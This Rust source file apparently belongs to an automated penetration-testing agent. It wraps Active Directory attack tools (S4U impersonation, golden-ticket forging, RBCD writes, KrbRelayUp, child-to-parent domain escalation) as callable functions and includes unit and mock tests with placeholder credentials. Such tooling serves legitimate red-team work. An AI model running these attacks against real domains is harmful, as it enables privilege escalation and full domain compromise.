//! Kerberos delegation and domain escalation tool executors.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Find delegation configurations in the domain using impacket-findDelegation.
///
/// Required args: `domain`, `username`, `dc_ip`
/// Optional args: `password`, `hash` (at least one required)
pub async fn find_delegation(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let dc_ip = required_str(args, "dc_ip")?;

    let mut cmd = CommandBuilder::new("impacket-findDelegation");

    if let Some(h) = hash {
        cmd = cmd
            .arg(format!("{domain}/{username}"))
            .args(credentials::hash_args(h));
    } else if let Some(p) = password {
        cmd = cmd.arg(format!("{domain}/{username}:{p}"));
    } else {
        anyhow::bail!("find_delegation requires either password or hash");
    }

    cmd.flag("-dc-ip", dc_ip).timeout_secs(120).execute().await
}

/// Perform an S4U (constrained delegation) attack to obtain a service ticket.
///
/// Required args: `domain`, `username`, `target_spn`, `impersonate`
/// Optional args: `password`, `hash`, `dc_ip`
pub async fn s4u_attack(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let target_spn = required_str(args, "target_spn")?;
    let impersonate = required_str(args, "impersonate")?;
    let dc_ip = optional_str(args, "dc_ip");

    // getST.py expects `domain/user:pass` or `domain/user -hashes :hash`
    // — no `@target` suffix (unlike secretsdump/wmiexec). The DC is
    // specified via `-dc-ip` instead.
    let mut cmd = CommandBuilder::new("impacket-getST")
        .flag("-spn", target_spn)
        .flag("-impersonate", impersonate);

    if let Some(h) = hash {
        cmd = cmd
            .arg(format!("{domain}/{username}"))
            .args(credentials::hash_args(h));
    } else if let Some(p) = password {
        cmd = cmd.arg(format!("{domain}/{username}:{p}"));
    } else {
        anyhow::bail!("s4u_attack requires either password or hash");
    }

    cmd = cmd.timeout_secs(120);

    cmd = cmd.flag_opt("-dc-ip", dc_ip);

    cmd.execute().await
}

/// Generate a Kerberos golden ticket using impacket-ticketer.
///
/// Required args: `krbtgt_hash`, `domain_sid`, `domain`
/// Optional args: `extra_sid`, `username`
pub async fn generate_golden_ticket(args: &Value) -> Result<ToolOutput> {
    let krbtgt_hash = required_str(args, "krbtgt_hash")?;
    let domain_sid = required_str(args, "domain_sid")?;
    let domain = required_str(args, "domain")?;
    let extra_sid = optional_str(args, "extra_sid");
    let username = optional_str(args, "username").unwrap_or("Administrator");

    CommandBuilder::new("impacket-ticketer")
        .flag("-nthash", krbtgt_hash)
        .flag("-domain-sid", domain_sid)
        .flag("-domain", domain)
        .flag_opt("-extra-sid", extra_sid)
        .flag("-user-id", "500")
        .arg(username)
        .timeout_secs(120)
        .execute()
        .await
}

/// Add a computer account to the domain using impacket-addcomputer.
///
/// Required args: `domain`, `username`, `password`, `computer_name`,
///                `computer_password`, `dc_ip`
pub async fn add_computer(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let computer_name = required_str(args, "computer_name")?;
    let computer_password = required_str(args, "computer_password")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target = format!("{domain}/{username}:{password}");

    CommandBuilder::new("impacket-addcomputer")
        .arg(target)
        .flag("-computer-name", computer_name)
        .flag("-computer-pass", computer_password)
        .flag("-dc-ip", dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

/// Add or remove an SPN on a target account using bloodyAD.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `action`,
///                `target_account`, `spn`
pub async fn addspn(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let action = required_str(args, "action")?;
    let target_account = required_str(args, "target_account")?;
    let spn = required_str(args, "spn")?;

    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);

    CommandBuilder::new("bloodyAD")
        .args(creds)
        .arg(action)
        .arg("spn")
        .arg(target_account)
        .arg(spn)
        .timeout_secs(120)
        .execute()
        .await
}

/// Write Resource-Based Constrained Delegation (RBCD) via impacket-rbcd.
///
/// Required args: `domain`, `username`, `password`, `target_computer`,
///                `attacker_sid`, `dc_ip`
pub async fn rbcd_write(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let target_computer = required_str(args, "target_computer")?;
    let attacker_sid = required_str(args, "attacker_sid")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target = format!("{domain}/{username}:{password}");

    CommandBuilder::new("impacket-rbcd")
        .flag("-delegate-to", target_computer)
        .flag("-delegate-from", attacker_sid)
        .flag("-action", "write")
        .flag("-dc-ip", dc_ip)
        .arg(target)
        .timeout_secs(120)
        .execute()
        .await
}

/// Run KrbRelayUp for local privilege escalation via Kerberos relay.
///
/// Required args: `domain`, `dc_ip`
/// Optional args: `method`, `create_user`, `create_password`
pub async fn krbrelayup(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let method = optional_str(args, "method");
    let create_user = optional_str(args, "create_user");
    let create_password = optional_str(args, "create_password");

    CommandBuilder::new("KrbRelayUp")
        .arg("relay")
        .flag("-d", domain)
        .flag("-dc", dc_ip)
        .flag_opt("-m", method)
        .flag_opt("-cls", create_user)
        .flag_opt("-cp", create_password)
        .timeout_secs(120)
        .execute()
        .await
}

/// Escalate from child domain to parent domain using raiseChild.py.
///
/// Required args: `child_domain`, `username`
/// Auth: `password` (plaintext) OR `hash` (NTLM pass-the-hash). At least one required.
/// Optional args: `target_domain`
pub async fn raise_child(args: &Value) -> Result<ToolOutput> {
    let child_domain = required_str(args, "child_domain")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let target_domain = optional_str(args, "target_domain");

    if password.is_none() && hash.is_none() {
        anyhow::bail!("raise_child requires either 'password' or 'hash' for authentication");
    }

    let mut cmd = CommandBuilder::new("raiseChild.py");

    if let Some(h) = hash {
        cmd = cmd
            .arg(format!("{child_domain}/{username}"))
            .args(credentials::hash_args(h));
    } else if let Some(p) = password {
        cmd = cmd.arg(format!("{child_domain}/{username}:{p}"));
    }

    cmd = cmd.flag_opt("-target-domain", target_domain);

    // raiseChild performs multiple secretsdumps internally — needs extra time
    cmd.timeout_secs(300).execute().await
}

#[cfg(test)]
mod tests {
    use crate::args::{optional_str, required_str};
    use crate::credentials;
    use serde_json::json;

    #[test]
    fn find_delegation_requires_domain() {
        let args = json!({
            "username": "admin",
            "dc_ip": "192.168.58.10",
            "password": "P@ssw0rd!"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn find_delegation_requires_username() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "password": "P@ssw0rd!"
        });
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn find_delegation_requires_dc_ip() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn find_delegation_with_password() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let domain = required_str(&args, "domain").unwrap();
        let username = required_str(&args, "username").unwrap();
        let password = optional_str(&args, "password");
        assert_eq!(domain, "contoso.local");
        assert_eq!(username, "admin");
        assert_eq!(password, Some("P@ssw0rd!"));
    }

    #[test]
    fn find_delegation_with_hash() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            "dc_ip": "192.168.58.10"
        });
        let hash = optional_str(&args, "hash").unwrap();
        let hash_args = credentials::hash_args(hash);
        assert_eq!(hash_args[0], "-hashes");
        // Hash already has colon, should be passed as-is
        assert!(hash_args[1].contains(':'));
    }

    #[test]
    fn find_delegation_requires_password_or_hash() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10"
        });
        let password = optional_str(&args, "password");
        let hash = optional_str(&args, "hash");
        assert!(password.is_none());
        assert!(hash.is_none());
    }

    #[test]
    fn find_delegation_no_auth_errors() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10"
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::find_delegation(&args));
        // Should bail with "requires either password or hash"
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("password or hash"));
    }

    #[test]
    fn s4u_attack_requires_target_spn() {
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "P@ssw0rd!",
            "impersonate": "Administrator"
        });
        assert!(required_str(&args, "target_spn").is_err());
    }

    #[test]
    fn s4u_attack_requires_impersonate() {
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "P@ssw0rd!",
            "target_spn": "cifs/dc01.contoso.local"
        });
        assert!(required_str(&args, "impersonate").is_err());
    }

    #[test]
    fn s4u_attack_all_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "P@ssw0rd!",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator",
            "dc_ip": "192.168.58.10"
        });
        assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
        assert_eq!(
            required_str(&args, "target_spn").unwrap(),
            "cifs/dc01.contoso.local"
        );
        assert_eq!(required_str(&args, "impersonate").unwrap(), "Administrator");
        assert_eq!(optional_str(&args, "dc_ip"), Some("192.168.58.10"));
    }

    #[test]
    fn s4u_attack_no_auth_errors() {
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator"
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::s4u_attack(&args));
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("password or hash"));
    }

    #[test]
    fn golden_ticket_requires_krbtgt_hash() {
        let args = json!({
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "krbtgt_hash").is_err());
    }

    #[test]
    fn golden_ticket_requires_domain_sid() {
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "domain_sid").is_err());
    }

    #[test]
    fn golden_ticket_default_username() {
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local"
        });
        let username = optional_str(&args, "username").unwrap_or("Administrator");
        assert_eq!(username, "Administrator");
    }

    #[test]
    fn golden_ticket_custom_username() {
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local",
            "username": "fakeadmin"
        });
        let username = optional_str(&args, "username").unwrap_or("Administrator");
        assert_eq!(username, "fakeadmin");
    }

    #[test]
    fn golden_ticket_extra_sid_optional() {
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local",
            "extra_sid": "S-1-5-21-0000000000-000000000-000000000-519"
        });
        assert_eq!(
            optional_str(&args, "extra_sid"),
            Some("S-1-5-21-0000000000-000000000-000000000-519")
        );
    }

    #[test]
    fn golden_ticket_extra_sid_absent() {
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local"
        });
        assert!(optional_str(&args, "extra_sid").is_none());
    }

    #[test]
    fn add_computer_all_required_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "jsmith",
            "password": "P@ssw0rd!",
            "computer_name": "EVIL$",
            "computer_password": "CompP@ss123!",
            "dc_ip": "192.168.58.10"
        });
        assert_eq!(required_str(&args, "computer_name").unwrap(), "EVIL$");
        assert_eq!(
            required_str(&args, "computer_password").unwrap(),
            "CompP@ss123!"
        );
        // Verify the target string format
        let domain = required_str(&args, "domain").unwrap();
        let username = required_str(&args, "username").unwrap();
        let password = required_str(&args, "password").unwrap();
        let target = format!("{domain}/{username}:{password}");
        assert_eq!(target, "contoso.local/jsmith:P@ssw0rd!");
    }

    #[test]
    fn add_computer_missing_computer_name() {
        let args = json!({
            "domain": "contoso.local",
            "username": "jsmith",
            "password": "P@ssw0rd!",
            "computer_password": "CompP@ss123!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "computer_name").is_err());
    }

    #[test]
    fn addspn_all_required_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "action": "add",
            "target_account": "svc_sql",
            "spn": "MSSQLSvc/sql01.contoso.local:1433"
        });
        assert_eq!(required_str(&args, "action").unwrap(), "add");
        assert_eq!(required_str(&args, "target_account").unwrap(), "svc_sql");
        assert_eq!(
            required_str(&args, "spn").unwrap(),
            "MSSQLSvc/sql01.contoso.local:1433"
        );
    }

    #[test]
    fn addspn_missing_spn() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "action": "add",
            "target_account": "svc_sql"
        });
        assert!(required_str(&args, "spn").is_err());
    }

    #[test]
    fn rbcd_write_all_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "target_computer": "dc01$",
            "attacker_sid": "S-1-5-21-1234567890-987654321-1122334455-1234",
            "dc_ip": "192.168.58.10"
        });
        assert_eq!(required_str(&args, "target_computer").unwrap(), "dc01$");
        assert_eq!(
            required_str(&args, "attacker_sid").unwrap(),
            "S-1-5-21-1234567890-987654321-1122334455-1234"
        );
        // Verify target format
        let domain = required_str(&args, "domain").unwrap();
        let username = required_str(&args, "username").unwrap();
        let password = required_str(&args, "password").unwrap();
        let target = format!("{domain}/{username}:{password}");
        assert_eq!(target, "contoso.local/admin:P@ssw0rd!");
    }

    #[test]
    fn rbcd_write_missing_attacker_sid() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "target_computer": "dc01$",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "attacker_sid").is_err());
    }

    #[test]
    fn krbrelayup_required_args_only() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10"
        });
        assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
        assert_eq!(required_str(&args, "dc_ip").unwrap(), "192.168.58.10");
        assert!(optional_str(&args, "method").is_none());
        assert!(optional_str(&args, "create_user").is_none());
        assert!(optional_str(&args, "create_password").is_none());
    }

    #[test]
    fn krbrelayup_with_optional_args() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "method": "rbcd",
            "create_user": "eviluser",
            "create_password": "Ev1lP@ss!"
        });
        assert_eq!(optional_str(&args, "method"), Some("rbcd"));
        assert_eq!(optional_str(&args, "create_user"), Some("eviluser"));
    }

    #[test]
    fn raise_child_requires_child_domain() {
        let args = json!({
            "username": "admin",
            "password": "P@ssw0rd!"
        });
        assert!(required_str(&args, "child_domain").is_err());
    }

    #[test]
    fn raise_child_no_auth_errors() {
        let args = json!({
            "child_domain": "child.contoso.local",
            "username": "admin"
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::raise_child(&args));
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("password' or 'hash'"));
    }

    #[test]
    fn raise_child_with_password_target_format() {
        let args = json!({
            "child_domain": "child.contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!"
        });
        let child_domain = required_str(&args, "child_domain").unwrap();
        let username = required_str(&args, "username").unwrap();
        let password = optional_str(&args, "password").unwrap();
        let target = format!("{child_domain}/{username}:{password}");
        assert_eq!(target, "child.contoso.local/admin:P@ssw0rd!");
    }

    #[test]
    fn raise_child_with_hash_target_format() {
        let args = json!({
            "child_domain": "child.contoso.local",
            "username": "admin",
            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0"
        });
        let child_domain = required_str(&args, "child_domain").unwrap();
        let username = required_str(&args, "username").unwrap();
        let hash = optional_str(&args, "hash").unwrap();
        let target = format!("{child_domain}/{username}");
        let hash_args = credentials::hash_args(hash);
        assert_eq!(target, "child.contoso.local/admin");
        assert_eq!(
            hash_args,
            vec!["-hashes", ":31d6cfe0d16ae931b73c59d7e0c089c0"]
        );
    }

    #[test]
    fn raise_child_target_domain_optional() {
        let args = json!({
            "child_domain": "child.contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "target_domain": "contoso.local"
        });
        assert_eq!(optional_str(&args, "target_domain"), Some("contoso.local"));
    }

    #[test]
    fn hash_args_with_nt_only() {
        let hash_args = credentials::hash_args("31d6cfe0d16ae931b73c59d7e0c089c0");
        assert_eq!(hash_args[0], "-hashes");
        assert_eq!(hash_args[1], ":31d6cfe0d16ae931b73c59d7e0c089c0");
    }

    #[test]
    fn hash_args_with_lm_nt() {
        let hash_args = credentials::hash_args(
            "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
        );
        assert_eq!(hash_args[0], "-hashes");
        assert_eq!(
            hash_args[1],
            "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
        );
    }

    #[test]
    fn impacket_auth_with_hash() {
        let (target, extra) = credentials::impacket_auth(
            Some("contoso.local"),
            "admin",
            None,
            Some("31d6cfe0d16ae931b73c59d7e0c089c0"),
            "192.168.58.10",
        );
        assert_eq!(target, "contoso.local/admin@192.168.58.10");
        assert_eq!(extra, vec!["-hashes", ":31d6cfe0d16ae931b73c59d7e0c089c0"]);
    }

    #[test]
    fn impacket_auth_with_password() {
        let (target, extra) = credentials::impacket_auth(
            Some("contoso.local"),
            "admin",
            Some("P@ssw0rd!"),
            None,
            "192.168.58.10",
        );
        assert_eq!(target, "contoso.local/admin:P@ssw0rd!@192.168.58.10");
        assert!(extra.is_empty());
    }

    #[test]
    fn kerberos_env() {
        let (key, val) = credentials::kerberos_env("/tmp/admin.ccache");
        assert_eq!(key, "KRB5CCNAME");
        assert_eq!(val, "/tmp/admin.ccache");
    }

    // --- mock executor tests ---

    use super::*;
    use crate::executor::mock;

    #[tokio::test]
    async fn find_delegation_with_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(find_delegation(&args).await.is_ok());
    }

    #[tokio::test]
    async fn find_delegation_with_hash_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            "dc_ip": "192.168.58.10"
        });
        assert!(find_delegation(&args).await.is_ok());
    }

    #[tokio::test]
    async fn s4u_attack_with_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "P@ssw0rd!",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator"
        });
        assert!(s4u_attack(&args).await.is_ok());
    }

    #[tokio::test]
    async fn s4u_attack_with_hash_and_dc_ip_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator",
            "dc_ip": "192.168.58.10"
        });
        assert!(s4u_attack(&args).await.is_ok());
    }

    #[tokio::test]
    async fn generate_golden_ticket_executes() {
        mock::push(mock::success());
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local"
        });
        assert!(generate_golden_ticket(&args).await.is_ok());
    }

    #[tokio::test]
    async fn generate_golden_ticket_with_extra_sid_executes() {
        mock::push(mock::success());
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local",
            "extra_sid": "S-1-5-21-0000000000-000000000-000000000-519",
            "username": "fakeadmin"
        });
        assert!(generate_golden_ticket(&args).await.is_ok());
    }

    #[tokio::test]
    async fn add_computer_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "jsmith",
            "password": "P@ssw0rd!",
            "computer_name": "EVIL$",
            "computer_password": "CompP@ss123!",
            "dc_ip": "192.168.58.10"
        });
        assert!(add_computer(&args).await.is_ok());
    }

    #[tokio::test]
    async fn addspn_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "action": "add",
            "target_account": "svc_sql",
            "spn": "MSSQLSvc/sql01.contoso.local:1433"
        });
        assert!(addspn(&args).await.is_ok());
    }

    #[tokio::test]
    async fn rbcd_write_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "target_computer": "dc01$",
            "attacker_sid": "S-1-5-21-1234567890-987654321-1122334455-1234",
            "dc_ip": "192.168.58.10"
        });
        assert!(rbcd_write(&args).await.is_ok());
    }

    #[tokio::test]
    async fn krbrelayup_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10"
        });
        assert!(krbrelayup(&args).await.is_ok());
    }

    #[tokio::test]
    async fn krbrelayup_with_options_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "method": "rbcd",
            "create_user": "eviluser",
            "create_password": "Ev1lP@ss!"
        });
        assert!(krbrelayup(&args).await.is_ok());
    }

    #[tokio::test]
    async fn raise_child_with_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "child_domain": "child.contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!"
        });
        assert!(raise_child(&args).await.is_ok());
    }

    #[tokio::test]
    async fn raise_child_with_hash_executes() {
        mock::push(mock::success());
        let args = json!({
            "child_domain": "child.contoso.local",
            "username": "admin",
            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "target_domain": "contoso.local"
        });
        assert!(raise_child(&args).await.is_ok());
    }
}
